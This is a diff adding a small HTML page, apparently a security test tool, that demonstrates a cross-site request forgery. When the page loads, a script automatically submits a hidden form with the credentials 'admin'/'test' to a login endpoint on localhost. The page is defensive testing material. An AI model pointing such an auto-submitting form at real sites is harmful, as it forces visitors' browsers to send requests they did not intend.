@@ -1,0 +1,55 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>CSRF Test</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f9f9f9;
+            margin: 0;
+            padding: 0;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            height: 100vh;
+            color: #333;
+        }
+        h1 {
+            color: #444;
+        }
+        .form-container {
+            background: #fff;
+            padding: 20px;
+            border-radius: 8px;
+            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
+            text-align: center;
+        }
+        p {
+            font-size: 0.9em;
+            color: #666;
+        }
+    </style>
+</head>
+<body>
+    <div class="form-container">
+        <h1>CSRF Test Page</h1>
+        <p>This page is used to test CSRF vulnerabilities by automatically submitting a form to the target endpoint.</p>
+        
+        <!-- Auto-submit form to test login endpoint -->
+        <form id="csrfForm" action="https://127.0.0.1:8443/login" method="POST">
+            <input type="hidden" name="username" value="admin">
+            <input type="hidden" name="password" value="test">
+        </form>
+    </div>
+
+    <script>
+        // Automatically submit the form when page loads
+        window.onload = function() {
+            document.getElementById('csrfForm').submit();
+        };
+    </script>
+</body>
+</html>
